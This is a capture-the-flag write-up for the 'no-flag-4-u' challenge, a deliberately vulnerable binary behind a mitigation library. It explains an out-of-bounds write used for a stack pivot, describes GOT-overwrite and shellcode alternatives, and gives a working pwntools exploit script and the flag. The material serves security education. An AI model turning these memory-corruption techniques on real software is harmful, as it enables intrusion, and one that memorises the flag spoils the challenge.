# no-flag-4-u

## Challenge

The binary provided is intentionally very vulnerable.
There are array out-of-bounds accesses, buffer overflows, use-after-frees, and format string vulnerabilities.

No-Flag-4-U is a project that aims to mitigate common vulnerabilities by wrapping certain dangerous functions.
The `libno_flag_4_u.so` library is provided, which mitigates many of the above vulnerabilities by hooking the calls to libc functions.
The binary was combiled from commit
[2b93970](https://github.com/Green-Avocado/No-Flag-4-U/tree/2b93970ca3a0e53cccb89450236be248f0166c48)
using the debug profile and no optional flags.

While there was a simple intended solution, the challenge was intentionally designed to allow for more creative solutions.
I was very pleased to read about the solutions that other competitors found.

### Checksec

```
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x400000)
    RWX:      Has RWX segments
```

### Main Disassembly

```c
ulong main(void) {
    ulong var_90h;
    ulong var_8h;
    
    sym.imp.alarm(0x3c);
    sym.imp.setbuf(_reloc.stdout, 0);
    sym.imp.setbuf(_reloc.stdin, 0);
    do {
        sym.imp.puts("1 : Create page");
        sym.imp.puts("2 : Edit page");
        sym.imp.puts("3 : Print page");
        sym.imp.puts("4 : Delete page");
        sym.imp.puts("5 : Exit");
        var_8h = sym.get_input();
    // switch table (6 cases) at 0x402078
        switch(var_8h) {
        case 1:
            sym.create_page(&var_90h);
            break;
        case 2:
            sym.edit_page(&var_90h);
            break;
        case 3:
            sym.print_page(&var_90h);
            break;
        case 4:
            sym.delete_page(&var_90h);
            break;
        case 5:
            return 0;
        }
    } while( true );
}
```

## Solution

Though we have a stack buffer overflow and no libc canary, we cannot simply overwrite the return address because No-Flag-4-U uses stored base pointers as canaries for some functions, including `gets`.

We cannot abuse the use-after-free because memory is never actually freed with these wrappers.

However, the array-out-of-bounds access means we can overwrite any stack value with a heap address, with contents that we control.
We can use this to overwrite a saved base pointer to a heap chunk.
After a couple returns, we can use this to stack pivot into the heap chunk, causing it to return to an address of our choosing.
Note that we are also somewhat limited to what addresses we can write, as all characters must be valid UTF-8.

The intended solution simply writes a `win` function address onto this heap chunk, which will cause the program to print the flag.

### Alternative Solutions

Many teams found that, instead of replacing the saved RBP to stack pivot, you could write to an address of your choosing, as long as it contained only UTF-8 characters.
This was done by editting at an index where a pointer to the stack existed, such as a saved RBP.
By editting at this index, one could write an almost arbitrary address onto the stack, which could then be editted to write any UTF-8 string to that address.
This was often used to replace a GOT entry with the `win` function address.

I was very happy to see that someone was able to abuse the RWX stack to cause the program to execute shellcode.
This was done by replacing a GOT entry, in the same manner as above, with a `call rax` gadget or similar.
One could then put UTF-8 shellcode onto the stack and execute it using this gadget.

## Exploit

```py
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host localhost --port 1337 chal
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('chal')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'localhost'
port = int(args.PORT or 1337)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    No RELRO
# Stack:    No canary found
# NX:       NX disabled
# PIE:      No PIE (0x400000)
# RWX:      Has RWX segments

io = start()

io.sendlineafter(b"5 : Exit\n", b'1')
io.sendlineafter(b"index: ", b'-2')
io.sendlineafter(b"size: ", b'8')
io.sendlineafter(b"content: ", flat({8:exe.sym['win']}))
io.sendlineafter(b"5 : Exit\n", b'5')

io.interactive()
```

## Flag

```
maple{OwO_flag_for_you?}
```
